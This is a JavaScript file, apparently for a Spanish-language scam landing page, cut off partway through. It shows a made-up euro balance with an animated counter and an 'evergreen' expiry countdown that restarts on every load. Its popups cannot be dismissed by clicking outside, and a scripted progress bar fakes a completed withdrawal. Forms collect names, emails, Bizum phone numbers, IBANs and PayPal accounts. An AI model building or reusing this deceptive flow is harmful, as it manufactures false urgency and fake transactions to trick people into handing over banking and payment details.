/* main.js — SPA router + contadores + loader + modal popup (abre 3s em #one)
   Versão unificada: o schedulePopupForOne() está no mesmo escopo de showScreen().
*/
(function () {
  /* ---------------------------
     Variáveis / helpers de modal
     --------------------------- */
  let modalTimer = null;
  let activeModalId = null;

  function showModal(id) {
    const modal = document.getElementById(id);
    if (!modal) return;

    activeModalId = id;
    modal.classList.add("is-modal", "is-active");
    modal.removeAttribute("aria-hidden");

    // Captura a posição atual do scroll APENAS se ainda não estiver travado
    if (!document.body.classList.contains("modal-open")) {
      const scrollY = window.scrollY;
      document.body.style.position = "fixed";
      document.body.style.top = `-${scrollY}px`;
      document.body.style.width = "100%";

      document.body.classList.add("modal-open");
      document.documentElement.classList.add("modal-open");
    }

    // Habilita o botão .btn-sacar em #one somente quando o primeiro popup (id="two") abrir
    if (id === "two") {
      const btnOneSacar = document.querySelector(
        "#one .container-saldo .btn-sacar"
      );
      if (btnOneSacar) {
        btnOneSacar.removeAttribute("disabled");
        btnOneSacar.style.pointerEvents = "auto";
        btnOneSacar.style.opacity = "";
      }

      // Anima o contador do popup quando ele for exibido
      setTimeout(() => {
        const popupCounter = modal.querySelector(
          ".valor-currency[data-amount-target]"
        );
        if (
          popupCounter &&
          typeof window.animateCurrencyCounter === "function"
        ) {
          // Reseta o texto para 0 antes de animar e força re-animação
          popupCounter.textContent = "0,00 €";
          window.animateCurrencyCounter(popupCounter, true); // true = forceReset
        }
      }, 50);
    }

    // overlay click: DESABILITADO - popups só fecham por botões específicos
    function overlayClickHandler(ev) {
      // Nenhum popup fecha ao clicar fora
      // Todos os popups só fecham através de botões específicos
      return;
    }
    modal.addEventListener("click", overlayClickHandler);
    modal._overlayHandler = overlayClickHandler;

    // fechar por botões com data-modal-close
    const closeButtons = Array.from(
      modal.querySelectorAll("[data-modal-close]")
    );
    modal._closeButtonHandlers = closeButtons.map((btn) => {
      const h = (ev) => {
        ev && ev.preventDefault();
        closeModal(id);
      };
      btn.addEventListener("click", h);
      return { btn, h };
    });

    // foco para primeiro elemento do modal
    const focusable = modal.querySelector(
      'button, a, input, [tabindex]:not([tabindex="-1"])'
    );
    if (focusable) focusable.focus();
  }

  function closeModal(id) {
    const modal = document.getElementById(id);
    if (!modal) return;

    if (modal._overlayHandler)
      modal.removeEventListener("click", modal._overlayHandler);
    if (modal._closeButtonHandlers) {
      modal._closeButtonHandlers.forEach(({ btn, h }) =>
        btn.removeEventListener("click", h)
      );
    }

    modal.classList.remove("is-active", "is-modal");
    modal.setAttribute("aria-hidden", "true");

    // Verifica se ainda existe algum modal aberto
    const remainingModals = document.querySelectorAll(
      ".screen.is-modal.is-active"
    );
    if (remainingModals.length === 0) {
      // Só destrava se não houver mais nenhum modal
      const scrollY = document.body.style.top;
      document.body.style.position = "";
      document.body.style.top = "";
      document.body.style.width = "";
      window.scrollTo(0, parseInt(scrollY || "0") * -1);

      document.body.classList.remove("modal-open");
      document.documentElement.classList.remove("modal-open");
    }

    activeModalId = null;

    // foco volta pra #one se existir
    const screenOne = document.getElementById("one");
    if (screenOne) {
      const f = screenOne.querySelector(
        'button, a, input, [tabindex]:not([tabindex="-1"])'
      );
      if (f) f.focus();
    }
  }

  function schedulePopupForOne() {
    clearModalTimer();
    modalTimer = setTimeout(() => {
      const one = document.getElementById("one");
      if (one && one.classList.contains("is-active")) {
        showModal("two");
      }
    }, 0);
  }

  function clearModalTimer() {
    if (modalTimer) {
      clearTimeout(modalTimer);
      modalTimer = null;
    }
  }

  // limpa timer ao sair da página
  window.addEventListener("beforeunload", clearModalTimer);

  /* ---------------------------
     Contadores (evergreen) — mantidos
     --------------------------- */
  function iniciarContadorInline(tempoTotal) {
    const timerElement = document.getElementById("timer");
    const textElement = document.getElementById("countdown-text");
    if (!timerElement || !textElement) return;

    let tempoRestante = tempoTotal;
    let contador = setInterval(() => {
      if (tempoRestante < 0) {
        clearInterval(contador);
        textElement.textContent = "TU SALDO HA EXPIRADO";
        return;
      }
      let minutos = Math.floor(tempoRestante / 60);
      let segundos = tempoRestante % 60;
      timerElement.textContent = `00 - ${String(minutos).padStart(
        2,
        "0"
      )} - ${String(segundos).padStart(2, "0")}`;
      tempoRestante--;
    }, 1000);
  }

  function iniciarContadorPopup(tempoTotal) {
    const todosOsTimersPopup = document.querySelectorAll(".expira-em-popup");
    if (!todosOsTimersPopup.length) return;

    todosOsTimersPopup.forEach((timerContainer, index) => {
      const minutesElement = timerContainer.querySelector(
        '[data-timer="minutes"]'
      );
      const secondsElement = timerContainer.querySelector(
        '[data-timer="seconds"]'
      );
      const labelElement = timerContainer.querySelector(".timer-label");
      if (!minutesElement || !secondsElement || !labelElement) return;

      let tempoRestante = tempoTotal;
      let contador = setInterval(() => {
        if (tempoRestante < 0) {
          clearInterval(contador);
          labelElement.textContent = "Expirado";
          minutesElement.textContent = "00";
          secondsElement.textContent = "00";
          return;
        }
        let minutos = Math.floor(tempoRestante / 60);
        let segundos = tempoRestante % 60;
        minutesElement.textContent = String(minutos).padStart(2, "0");
        secondsElement.textContent = String(segundos).padStart(2, "0");
        tempoRestante--;
      }, 1000);
    });
  }

  /* ---------------------------
     Loader (barra de progresso)
     --------------------------- */
  /* ---------------------------
     Loader (barra de progresso)
     --------------------------- */
  let loaderState = {
    timeouts: [],
    interval: null,
  };

  function resetLoader() {
    const loadingText = document.getElementById("loading-text");
    const progressBar = document.getElementById("progress-bar");
    if (!loadingText || !progressBar) return;

    // Clear all scheduled timeouts
    loaderState.timeouts.forEach((t) => clearTimeout(t));
    loaderState.timeouts = [];

    if (loaderState.interval) {
      clearInterval(loaderState.interval);
      loaderState.interval = null;
    }

    // Reset UI
    progressBar.style.transition = "none";
    progressBar.style.width = "0%";
    loadingText.textContent = "Iniciando...";
    loadingText.style.opacity = "1";
  }

  function startLoader() {
    const loadingText = document.getElementById("loading-text");
    const progressBar = document.getElementById("progress-bar");
    if (!loadingText || !progressBar) return;

    resetLoader(); // Ensure clean state

    const steps = [
      { text: "Validando tus datos", progress: 25 },
      { text: "Completando la retirada", progress: 50 },
      { text: "Procesando transacción", progress: 75 },
      { text: "Finalizando", progress: 100 },
    ];
    const stepDuration = 3000,
      textFadeDuration = 400,
      dotAnimationSpeed = 800;

    let currentStep = 0;

    // Restore transition
    // Force reflow before adding transition back
    void progressBar.offsetWidth;
    progressBar.style.transition = `width ${stepDuration / 1000}s linear`;

    function scheduleNextStep() {
      if (currentStep < steps.length) {
        if (loaderState.interval) clearInterval(loaderState.interval);

        loadingText.style.opacity = 0;

        const t1 = setTimeout(() => {
          const step = steps[currentStep];
          const baseText = step.text;
          loadingText.textContent = baseText;
          // Calcula a largura considerando o padding de 20px de cada lado
          const containerWidth = progressBar.parentElement.offsetWidth - 40; // 20px de cada lado
          progressBar.style.width =
            (containerWidth * step.progress) / 100 + "px";
          loadingText.style.opacity = 1;

          let dotCount = 0;
          loaderState.interval = setInterval(() => {
            dotCount = (dotCount % 3) + 1;
            loadingText.textContent = baseText + ".".repeat(dotCount);
          }, dotAnimationSpeed);

          currentStep++;
          const t2 = setTimeout(scheduleNextStep, stepDuration);
          loaderState.timeouts.push(t2);
        }, textFadeDuration);
        loaderState.timeouts.push(t1);
      } else {
        if (loaderState.interval) clearInterval(loaderState.interval);
        loadingText.style.opacity = 0;

        const t3 = setTimeout(() => {
          loadingText.textContent = "¡Retirada completada!";
          loadingText.style.opacity = 1;
        }, textFadeDuration);
        loaderState.timeouts.push(t3);
      }
    }

    // Start
    const tStart = setTimeout(scheduleNextStep, 500);
    loaderState.timeouts.push(tStart);
  }

  // Expose globally
  window.startLoader = startLoader;
  window.resetLoader = resetLoader;

  /* ---------------------------
     Nova animação de loading (#seven)
     --------------------------- */
  /* ---------------------------
     Nova animação de loading (#seven)
     --------------------------- */
  let newLoadingState = {
    interval: null,
    timeouts: [],
  };

  function startNewLoadingAnimation() {
    const loadingText = document.getElementById("new-loading-text");
    const progressBar = document.getElementById("new-progress-bar");

    if (!loadingText || !progressBar) return;

    // Reset state
    resetNewLoadingAnimation();

    // Force faster transition to match new speed
    progressBar.style.transition = "width 1.3s ease-in-out";

    const texts = [
      "Validando datos...",
      "Conectando al servidor...",
      "Completando el rescate...",
      "Casi listo...",
    ];

    // Set initial text immediately
    loadingText.textContent = texts[0];

    let currentIndex = 0;
    const totalSteps = texts.length;
    const progressPerStep = 100 / totalSteps;

    function updateProgress() {
      const progress = (currentIndex + 1) * progressPerStep;
      progressBar.style.width = `${progress}%`;
    }

    // Inicializar progresso
    updateProgress();

    function changeText() {
      loadingText.style.opacity = 0;

      const t1 = setTimeout(() => {
        currentIndex++;
        loadingText.textContent = texts[currentIndex];
        loadingText.style.opacity = 1;

        // Atualizar progresso com transição suave
        updateProgress();
      }, 150);
      newLoadingState.timeouts.push(t1);
    }

    // Loop de textos
    newLoadingState.interval = setInterval(() => {
      if (currentIndex >= totalSteps - 1) {
        // Chegou no último passo ("Casi listo...")
        clearInterval(newLoadingState.interval);

        // Finaliza e redireciona
        const tEnd = setTimeout(() => {
          if (typeof window.showScreen === "function") {
            window.showScreen("nine");
          } else {
            location.hash = "#nine";
          }
        }, 700);
        newLoadingState.timeouts.push(tEnd);
        return;
      }
      changeText();
    }, 1600);
  }

  function resetNewLoadingAnimation() {
    const loadingText = document.getElementById("new-loading-text");
    const progressBar = document.getElementById("new-progress-bar");

    if (newLoadingState.interval) {
      clearInterval(newLoadingState.interval);
      newLoadingState.interval = null;
    }
    newLoadingState.timeouts.forEach((t) => clearTimeout(t));
    newLoadingState.timeouts = [];

    if (loadingText) {
      loadingText.textContent = "Validando acceso...";
      loadingText.style.opacity = 1;
    }
    if (progressBar) {
      progressBar.style.transition = "none";
      progressBar.style.width = "0%";
      // Força reflow
      void progressBar.offsetWidth;
      progressBar.style.transition =
        "width 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94)";
    }
  }

  // Expose globally
  window.startNewLoadingAnimation = startNewLoadingAnimation;
  window.resetNewLoadingAnimation = resetNewLoadingAnimation;

  /* ---------------------------
     Função para preencher página de confirmação (#nine)
     --------------------------- */
  function fillConfirmationPage() {
    // Tenta pegar do objeto global ou do localStorage
    let formData = window.__formData;
    if (!formData) {
      try {
        const stored = localStorage.getItem("userPixData");
        if (stored) {
          formData = JSON.parse(stored);
        }
      } catch (e) {
        console.error("Erro ao ler localStorage", e);
      }
    }

    if (!formData) return;

    // Função para formatar data atual
    function getCurrentDate() {
      const now = new Date();
      const day = String(now.getDate()).padStart(2, "0");
      const month = String(now.getMonth() + 1).padStart(2, "0");
      const year = now.getFullYear();
      return `${day}/${month}/${year}`;
    }

    // Preenche o nome (editável)
    const nameElement = document.getElementById("confirmation-name");
    if (nameElement && formData.nome) {
      nameElement.value = formData.nome;
    }

    // Preenche o correo electrónico (editável)
    const emailElement = document.getElementById("confirmation-email");
    if (emailElement && formData.correo) {
      emailElement.value = formData.correo;
    }

    // Preenche o método (label dinâmico + valor editável)
    const metodoLabelEl = document.getElementById("confirmation-metodo-label");
    const metodoValueEl = document.getElementById("confirmation-metodo-value");
    if (metodoLabelEl && formData.metodoLabel) {
      metodoLabelEl.textContent = formData.metodoLabel;
    }
    if (metodoValueEl && formData.metodoValor) {
      metodoValueEl.value = formData.metodoValor;
    }

    // Preenche a data atual
    const dateElement = document.getElementById("confirmation-date");
    if (dateElement) {
      dateElement.textContent = getCurrentDate();
    }


    // Preenche a chave PIX digitada
    const pixKeyElement = document.getElementById("confirmation-pix-key");
    if (pixKeyElement && formData.chavePix) {
      // O valor já deve estar formatado do input, mas garante formatação se necessário
      let formattedKey = formData.chavePix;

      if (formData.tipoChave === "DNI") {
        // Se não estiver formatado, formata
        if (!formattedKey.includes(".") && !formattedKey.includes("-")) {
          const cleanCPF = formattedKey.replace(/\D/g, "");
          if (cleanCPF.length === 11) {
            formattedKey = cleanCPF
              .replace(/(\d{3})(\d)/, "$1.$2")
              .replace(/(\d{3})(\d)/, "$1.$2")
              .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
          }
        }
      } else if (formData.tipoChave === "Móvil") {
        // Formata celular se necessário (opcional, geralmente já vem formatado)
        const cleanPhone = formattedKey.replace(/\D/g, "");
        if (
          cleanPhone.length >= 10 &&
          cleanPhone.length <= 11 &&
          !formattedKey.includes("(")
        ) {
          if (cleanPhone.length === 11) {
            formattedKey = cleanPhone.replace(
              /(\d{2})(\d{5})(\d{4})/,
              "($1) $2-$3"
            );
          } else if (cleanPhone.length === 10) {
            formattedKey = cleanPhone.replace(
              /(\d{2})(\d{4})(\d{4})/,
              "($1) $2-$3"
            );
          }
        }
      }
      // Para E-mail e Clave aleatoria, mantém como está

      pixKeyElement.textContent = formattedKey;
    }
  }

  // Expose globally
  window.fillConfirmationPage = fillConfirmationPage;

  /* ---------------------------
     SPA Router (inicia screens e navegação)
     --------------------------- */
  function initRouter() {
    const screens = Array.from(document.querySelectorAll("#screens .screen"));
    if (!screens.length) return;

    function showScreen(id, push = true) {
      const target = document.getElementById(id);
      if (!target) {
        console.warn(`Tela "${id}" não encontrada.`);
        return;
      }

      screens.forEach((s) => {
        if (s === target) {
          s.classList.add("is-active");
          s.removeAttribute("aria-hidden");
        } else {
          s.classList.remove("is-active");
          s.setAttribute("aria-hidden", "true");
        }
      });

      if (push) {
        try {
          history.pushState({ screen: id }, "", "#" + id);
        } catch (e) {
          location.hash = id;
        }
      }

      // Scroll to top when showing a new screen
      window.scrollTo(0, 0);
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;

      // Para #nine, força scroll para o topo após renderização
      if (id === "nine") {
        // Scroll imediato
        window.scrollTo({ top: 0, left: 0, behavior: "instant" });
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;

        // Scroll novamente após renderização para garantir
        setTimeout(() => {
          window.scrollTo({ top: 0, left: 0, behavior: "instant" });
          document.documentElement.scrollTop = 0;
          document.body.scrollTop = 0;
          const nineElement = document.getElementById("nine");
          if (nineElement) {
            nineElement.scrollTop = 0;
            // Também força scroll no container se houver
            const container = nineElement.querySelector(
              ".confirmation-container"
            );
            if (container) {
              container.scrollTop = 0;
            }
          }
        }, 100);
      }

      const focusable = target.querySelector(
        'button, a, input, select, textarea, [tabindex]:not([tabindex="-1"])'
      );
      if (focusable) focusable.focus({ preventScroll: true });

      // >>> Aqui garantimos que o popup seja agendado quando entrarmos em #one
      if (id === "one") {
        schedulePopupForOne();
      } else {
        clearModalTimer();

        // Garante que o sticky popup suma ao sair da #one
        const stickyPopup = document.getElementById("popup-um");
        if (stickyPopup) {
          stickyPopup.classList.remove("is-visible");
        }

        // Se for para #seven, fecha todos os modais e inicia novo loader
        if (id === "seven") {
          const modalIds = ["two", "four", "five", "six"];
          modalIds.forEach((modalId) => {
            const modal = document.getElementById(modalId);
            if (modal && modal.classList.contains("is-modal")) {
              closeModal(modalId);
            }
          });
          // Inicia a nova animação de loading
          if (typeof startNewLoadingAnimation === "function") {
            startNewLoadingAnimation();
          }
        } else {
          // Se não for #seven, reseta o loader
          if (typeof window.resetLoader === "function") {
            window.resetLoader();
          }

          // Reseta a nova animação de loading se estiver ativa
          if (typeof resetNewLoadingAnimation === "function") {
            resetNewLoadingAnimation();
          }

          if (activeModalId) {
            closeModal(activeModalId);
          }
        }
      }

      // Anima contador da tela #three quando ela for exibida
      if (
        id === "three" &&
        typeof window.animateCurrencyCounter === "function"
      ) {
        // Usa um timeout maior para garantir que a tela está totalmente renderizada
        // e cancela qualquer timeout anterior para evitar múltiplas animações
        if (target._threeAnimationTimeout) {
          clearTimeout(target._threeAnimationTimeout);
        }
        target._threeAnimationTimeout = setTimeout(() => {
          const threeCounter = target.querySelector(
            ".valor-currency[data-amount-target]"
          );
          if (threeCounter) {
            // Garante que o elemento ainda está visível antes de animar
            if (target.classList.contains("is-active")) {
              window.animateCurrencyCounter(threeCounter, true); // true = forceReset
            }
          }
          target._threeAnimationTimeout = null;
        }, 100);
      }

      // Preenche dados na página de confirmação (#nine) quando ela for exibida
      if (id === "nine") {
        // Garante que a página apareça no topo
        window.scrollTo(0, 0);
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;

        // Preenche imediatamente para evitar flash de conteúdo vazio
        fillConfirmationPage();

        setTimeout(() => {
          // Força scroll para o topo novamente após renderização
          window.scrollTo(0, 0);
          document.documentElement.scrollTop = 0;
          document.body.scrollTop = 0;
          const nineElement = document.getElementById("nine");
          if (nineElement) {
            nineElement.scrollTop = 0;
          }

          // Animação do saldo (pode ficar no timeout ou fora, mas fora é mais garantido de iniciar logo)
          const confirmationBalance = document.querySelector(
            ".confirmation-balance-amount[data-amount-target]"
          );
          if (
            confirmationBalance &&
            typeof window.animateCurrencyCounter === "function"
          ) {
            window.animateCurrencyCounter(confirmationBalance, true);
          }
        }, 150);
      }
    }

    window.addEventListener("popstate", (ev) => {
      const id =
        (ev.state && ev.state.screen) ||
        location.hash.replace("#", "") ||
        screens[0].id;
      showScreen(id, /*push*/ false);
    });

    // inicial: usa hash ou primeira screen
    const initial = location.hash.replace("#", "") || screens[0].id;
    showScreen(initial, /*push*/ false);

    // expõe globalmente se precisar (útil pra debugging)
    window.showScreen = showScreen;
  }

  // Se preferir JS: torna o botão .btn-sacar um link para a screen 'three'

  document.addEventListener("DOMContentLoaded", () => {
    const btnSacar =
      document.querySelector("#one .container-saldo .btn-sacar") ||
      document.querySelector(".btn-sacar");
    if (btnSacar) {
      btnSacar.addEventListener("click", function (ev) {
        ev.preventDefault();
        // fecha modal/timers caso haja algum aberto (opcional)
        if (typeof clearModalTimer === "function") clearModalTimer();
        if (typeof closeModal === "function" && activeModalId)
          closeModal(activeModalId);

        // usa a função global do router para trocar de tela
        if (typeof window.showScreen === "function") {
          window.showScreen("three");
        } else {
          // fallback: altera hash
          location.hash = "#three";
        }
      });
    }
  });

  /* ---------------------------
     Inicialização
     --------------------------- */
  document.addEventListener("DOMContentLoaded", () => {
    initRouter();

    // iniciadores de contador (evergreen) — ajuste o tempo aqui se quiser
    const tempoInicialEmSegundos = 16 * 60 + 38;
    iniciarContadorInline(tempoInicialEmSegundos);
    iniciarContadorPopup(tempoInicialEmSegundos);

    // initLoaderIfExists(); // Removido para iniciar apenas no #seven

    initStickyPopup();

    // Garante que o popup inicial seja agendado se estivermos na #one
    const currentHash = location.hash.replace("#", "") || "one";
    if (currentHash === "one") {
      schedulePopupForOne();
    }
  });

  /* ---------------------------
     Sticky Popup Logic
     --------------------------- */
  function initStickyPopup() {
    const saldoSection = document.querySelector("#one .saldo");
    const stickyPopup = document.getElementById("popup-um");
    const screenOne = document.getElementById("one");

    if (!saldoSection || !stickyPopup || !screenOne) return;

    // Configura botão de sacar do popup para funcionar igual ao principal
    const btnSacarPopup = stickyPopup.querySelector(".btn-sacar");
    if (btnSacarPopup) {
      btnSacarPopup.addEventListener("click", (ev) => {
        ev.preventDefault();
        if (typeof window.showScreen === "function") {
          window.showScreen("three");
        } else {
          location.hash = "#three";
        }
      });
    }

    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          // Se .saldo NÃO está intersectando (saiu da tela) E #one está ativo
          if (
            !entry.isIntersecting &&
            screenOne.classList.contains("is-active")
          ) {
            stickyPopup.classList.add("is-visible");
          } else {
            stickyPopup.classList.remove("is-visible");
          }
        });
      },
      {
        threshold: 0, // Dispara assim que qualquer parte sair/entrar
        rootMargin: "-50px 0px 0px 0px", // Ajuste fino para disparar um pouco antes de sumir totalmente
      }
    );

    observer.observe(saldoSection);

    // Expõe para ser usado no router
    window.__stickyObserver = observer;
  }

  // expõe helpers para caso queira manipular modal manualmente em console
  window.__spa_modal_helpers = {
    schedulePopupForOne,
    clearModalTimer,
    showModal,
    closeModal,
  };

  /* ===== Delegação para botões que fecham modal (funciona mesmo se botão não tiver listener) ===== */
  document.body.addEventListener("click", function (ev) {
    const btn = ev.target.closest("[data-modal-close]");
    if (!btn) return;
    ev.preventDefault();

    // procura o modal ancestor (section com class "screen")
    const modalAncestor = btn.closest(".screen");
    const modalId = modalAncestor ? modalAncestor.id : "two";

    // Se closeModal estiver no escopo (dentro da IIFE), usa diretamente.
    // Caso use outra instância, tenta o helper exposto window.__spa_modal_helpers.closeModal
    if (typeof closeModal === "function") {
      closeModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.closeModal === "function"
    ) {
      window.__spa_modal_helpers.closeModal(modalId);
    } else {
      // fallback: tenta esconder a section manualmente
      const modalEl = document.getElementById(modalId);
      if (modalEl) {
        modalEl.classList.remove("is-active", "is-modal");
        modalEl.setAttribute("aria-hidden", "true");
        document.body.classList.remove("modal-open");
      }
    }
  });

  /* ===== Delegação para abrir modais (pix-item abre #five) ===== */
  /* ===== Delegação para abrir modais (pix-item abre #five) ===== */
  document.body.addEventListener("click", function (ev) {
    const opener = ev.target.closest("[data-open-modal]");
    if (!opener) return;

    const modalId = opener.getAttribute("data-open-modal");
    if (!modalId) return;

    ev.preventDefault();
    ev.stopPropagation();

    // Lógica específica para abrir o modal de seleção de PIX (#six)
    if (modalId === "six") {
      const selectorText = document.getElementById("pix-selector-text");
      if (selectorText) {
        const currentType = selectorText.textContent.trim();

        // Mapeamento de Texto -> ID do Radio
        const typeToId = {
          CPF: "key-cpf",
          "Correo electrónico": "key-email",
          Celular: "key-celular",
          "Clave aleatoria": "key-aleatoria",
        };

        const radioId = typeToId[currentType];
        if (radioId) {
          const radio = document.getElementById(radioId);
          if (radio) radio.checked = true;
        }
      }
    }

    // Configura o modal #five conforme o método (Bizum / Banco / PayPal)
    if (modalId === "five") {
      const method = opener.getAttribute("data-method") || "bizum";
      const config = {
        bizum: {
          title: "Vincular Bizum",
          icon: "images/bizum-logo.png",
          label: "Número de teléfono",
          placeholder: "+34 600 000 000",
          type: "tel",
        },
        banco: {
          title: "Vincular Banco",
          icon: "images/skrill-logo.png",
          label: "IBAN",
          placeholder: "ES00 0000 0000 0000 0000 0000",
          type: "text",
        },
        paypal: {
          title: "Vincular PayPal",
          icon: "images/paypal-logo.jpg",
          label: "Correo PayPal",
          placeholder: "tu@correo.com",
          type: "email",
        },
        revolut: {
          title: "Vincular Revolut",
          icon: "images/revolut-logo.jpg",
          label: "Número de teléfono",
          placeholder: "+34 600 000 000",
          type: "tel",
        },
      };
      const cfg = config[method] || config.bizum;
      const titleEl = document.getElementById("vincular-title");
      const iconEl = document.getElementById("vincular-icon");
      const labelEl = document.getElementById("metodo-label");
      const inputEl = document.getElementById("metodo-input");
      if (titleEl) titleEl.textContent = cfg.title;
      if (iconEl) { iconEl.src = cfg.icon; iconEl.alt = cfg.title; }
      if (labelEl) labelEl.textContent = cfg.label;
      if (inputEl) {
        inputEl.placeholder = cfg.placeholder;
        inputEl.value = "";
      }
      const nomeEl = document.getElementById("nome");
      const correoEl = document.getElementById("correo");
      if (nomeEl) nomeEl.value = "";
      if (correoEl) correoEl.value = "";
    }

    // Abre o modal usando a função showModal
    if (typeof showModal === "function") {
      showModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.showModal === "function"
    ) {
      window.__spa_modal_helpers.showModal(modalId);
    }
  });

  // Suporte para tecla Enter no pix-item (acessibilidade)
  document.body.addEventListener("keydown", function (ev) {
    if (ev.key !== "Enter" && ev.key !== " ") return;

    const opener = ev.target.closest("[data-open-modal]");
    if (!opener) return;

    const modalId = opener.getAttribute("data-open-modal");
    if (!modalId) return;

    ev.preventDefault();
    ev.stopPropagation();

    if (typeof showModal === "function") {
      showModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.showModal === "function"
    ) {
      window.__spa_modal_helpers.showModal(modalId);
    }
  });

  /* ===== Função para fechar todos os modais abertos ===== */
  function closeAllModals() {
    const modalIds = ["two", "four", "five", "six"];
    modalIds.forEach((modalId) => {
      const modal = document.getElementById(modalId);
      if (modal && modal.classList.contains("is-modal")) {
        if (typeof closeModal === "function") {
          closeModal(modalId);
        } else if (
          window.__spa_modal_helpers &&
          typeof window.__spa_modal_helpers.closeModal === "function"
        ) {
          window.__spa_modal_helpers.closeModal(modalId);
        } else {
          // fallback: fecha manualmente
          modal.classList.remove("is-active", "is-modal");
          modal.setAttribute("aria-hidden", "true");
          document.body.classList.remove("modal-open");
        }
      }
    });
    activeModalId = null;
  }

  /* ===== Lógica de Seleção de Chave PIX e Validação ===== */

  // Helpers de Validação
  function validateCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, "");
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
    let soma = 0,
      resto;
    for (let i = 1; i <= 9; i++)
      soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.substring(9, 10))) return false;
    soma = 0;
    for (let i = 1; i <= 10; i++)
      soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    return resto === parseInt(cpf.substring(10, 11));
  }

  function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function validatePhone(phone) {
    const cleanPhone = phone.replace(/\D/g, "");
    return cleanPhone.length >= 10 && cleanPhone.length <= 11;
  }

  function validateRandomKey(key) {
    // Validação simplificada de UUID (32 hex chars + 4 hifens = 36 chars)
    // Formato: 8-4-4-4-12
    return /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(
      key
    );
  }

  // Função de validação geral (Bizum / Banco / PayPal)
  function checkPixFormValidity() {
    const nomeInput = document.getElementById("nome");
    const correoInput = document.getElementById("correo");
    const metodoInput = document.getElementById("metodo-input");
    const btnEnviar = document.getElementById("btn-enviar-pix");

    if (!nomeInput || !correoInput || !metodoInput || !btnEnviar) return;

    const isNomeFilled = nomeInput.value.trim().length >= 2;
    const isCorreoValid = validateEmail(correoInput.value.trim());
    const isMetodoFilled = metodoInput.value.trim().length > 0;

    if (isNomeFilled && isCorreoValid && isMetodoFilled) {
      btnEnviar.classList.remove("btn-disabled");
    } else {
      btnEnviar.classList.add("btn-disabled");
    }
  }

  // Listeners para validação em tempo real
  ["nome", "correo", "metodo-input"].forEach((id) => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("input", checkPixFormValidity);
  });


  // 1. Seleção do Tipo de Chave (no popup #six)
  document.body.addEventListener("click", function (ev) {
    const optionRow = ev.target.closest("#six .option-row");
    if (!optionRow) return;

    ev.preventDefault();
    ev.stopPropagation();

    // Pega o texto da opção selecionada (ex: CPF, E-mail...)
    const optionTextEl = optionRow.querySelector(".option-text");
    const selectedType = optionTextEl
      ? optionTextEl.textContent.trim()
      : "Chave";

    // Atualiza o texto do seletor na tela #five
    const selectorText = document.getElementById("pix-selector-text");
    if (selectorText) {
      selectorText.textContent = selectedType;
      selectorText.style.color = "#000"; // Opcional: mudar cor para indicar seleção
    }

    // Habilita o input de chave
    const keyInput = document.getElementById("pix-key-input");
    const keyWrapper = document.getElementById("pix-key-wrapper");

    if (keyInput) {
      keyInput.value = ""; // Limpa o campo ao trocar o tipo
      keyInput.removeAttribute("disabled");
      keyInput.classList.remove("input-disabled");
      keyInput.focus();
    }

    if (keyWrapper) {
      keyWrapper.classList.remove("input-wrapper-disabled");
    }

    // Remove estado de erro do seletor se houver
    const selector = document.getElementById("pix-type-selector");
    if (selector) {
      selector.classList.remove("input-error", "shake-animation");
    }

    // Revalida o formulário após seleção
    checkPixFormValidity();

    // Fecha o modal de seleção (#six)
    // Nota: não fecha todos, apenas o #six para voltar ao #five
    if (typeof closeModal === "function") {
      closeModal("six");
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.closeModal === "function"
    ) {
      window.__spa_modal_helpers.closeModal("six");
    }
  });

  // 2. Feedback visual ao tentar clicar no input desabilitado
  document.body.addEventListener("click", function (ev) {
    // Verifica se clicou no wrapper do input desabilitado
    const wrapper = ev.target.closest("#pix-key-wrapper");
    if (!wrapper) return;

    // Se o input estiver desabilitado (wrapper tem a classe)
    if (wrapper.classList.contains("input-wrapper-disabled")) {
      const selector = document.getElementById("pix-type-selector");
      if (selector) {
        // Remove classes para reiniciar animação se já estiver rodando
        selector.classList.remove("shake-animation", "input-error");

        // Força reflow
        void selector.offsetWidth;

        // Adiciona classes de erro e animação
        selector.classList.add("input-error", "shake-animation");

        // Remove a animação depois que terminar
        setTimeout(() => {
          selector.classList.remove("shake-animation");
        }, 500);
      }
    }
  });

  // 3. Validação e Envio (Botão Enviar no #five)
  document.body.addEventListener("click", function (ev) {
    const btnEnviar = ev.target.closest("#btn-enviar-pix");
    if (!btnEnviar) return;

    ev.preventDefault();

    const nomeInput = document.getElementById("nome");
    const correoInput = document.getElementById("correo");
    const metodoInput = document.getElementById("metodo-input");
    const metodoLabel = document.getElementById("metodo-label");

    // Se o botão estiver desabilitado, executa validação visual (shake)
    if (btnEnviar.classList.contains("btn-disabled")) {
      const shake = (el) => {
        if (!el) return;
        el.classList.remove("shake-animation", "input-error");
        void el.offsetWidth;
        el.classList.add("input-error", "shake-animation");
        setTimeout(() => el.classList.remove("shake-animation"), 500);
      };

      if (nomeInput && nomeInput.value.trim().length < 2) shake(nomeInput);
      if (correoInput && !validateEmail(correoInput.value.trim())) shake(correoInput);
      if (metodoInput && metodoInput.value.trim() === "") shake(metodoInput);

      return; // Impede envio
    }

    // Captura os dados do formulário
    const formData = {
      nome: nomeInput ? nomeInput.value.trim() : "",
      correo: correoInput ? correoInput.value.trim() : "",
      metodoLabel: metodoLabel ? metodoLabel.textContent.trim() : "",
